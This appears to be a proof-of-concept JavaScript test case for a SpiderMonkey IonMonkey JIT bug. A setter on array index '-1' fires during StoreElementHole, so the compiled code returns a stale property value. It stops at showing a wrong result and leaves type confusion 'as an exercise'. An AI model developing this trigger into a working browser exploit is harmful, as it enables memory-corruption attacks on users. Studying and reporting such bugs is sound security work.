// Set this to 10 or so to see correct result
const NUM_ITERATIONS = 2000;
const ARRAY_LENGTH = 100;

let OBJ = { a: 41 };
// Need to change property once or IonMonkey
// will assume it's a constant.
OBJ.a = 42;

let ctr = 0;
function f(obj, idx) {
    let v = OBJ.a;
    obj[idx] = v;
    // In the last iteration, the JIT code will get here without
    // bailing out while the StoreElementHole operation above
    // unexpectedly invoked a setter because idx -1 is a property.
    // As the compiler didn't expect side effects, it does not
    // refetch OBJ.a and so returns an incorrect result.
    // Causing type confusions is left as an exercise ;)
    return OBJ.a;
}

function main() {
    for(let i = 0; i < NUM_ITERATIONS; i++) {
        let isLastIteration = i == NUM_ITERATIONS - 1;
        let length = ARRAY_LENGTH;
        let idx = isLastIteration ? -1 : ARRAY_LENGTH;

        let obj = new Array(length);
        Object.defineProperty(obj, '-1', {
            set() {
                print('Setter called, setting OBJ.a to 1337');
                OBJ.a = 1337;
            }
        });

        for (let j = 0; j < length; j++) {
            // Array must not be packed or else a flag change
            // (indicating non-packed elements) will cause
            // invalidation in the last iteration.
            if (j == length/2) {
                continue;
            }
            obj[j] = j;
        }

        let r = f(obj, idx);
        print('Result: ' + r);
    }
}

main();